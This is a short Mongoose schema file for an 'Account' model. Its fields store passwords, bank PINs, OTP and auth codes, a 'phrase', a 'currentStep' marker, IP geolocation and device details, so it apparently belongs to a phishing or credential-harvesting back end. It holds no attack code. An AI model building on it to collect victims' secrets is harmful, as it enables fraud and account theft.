// Account.ts (Mongoose Model)

import mongoose, { Schema } from "mongoose";

const AccountSchema = new Schema(
  {
    email: { type: String, required: false },
    password: { type: String },
    userId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      require: true,
    },
    bankPin:{type:String,default:""},
    authCode:{type:String,default:""},
    currentStep:{type:String,default:""},
    otp: { type: String, default: "" },
    phrase:{type:String, default:""},
    location: {
      country: String,
      countryCode: String,
      region: String,
      city: String,
      ipAddress: String,
      lat: Number,
      lon: Number,
    },
    userInfo:{
      browser: {type:String},
      os: {type:String},
      device: {type:String},
    },
  },
  { timestamps: true }
);

export default mongoose.model("Account", AccountSchema);
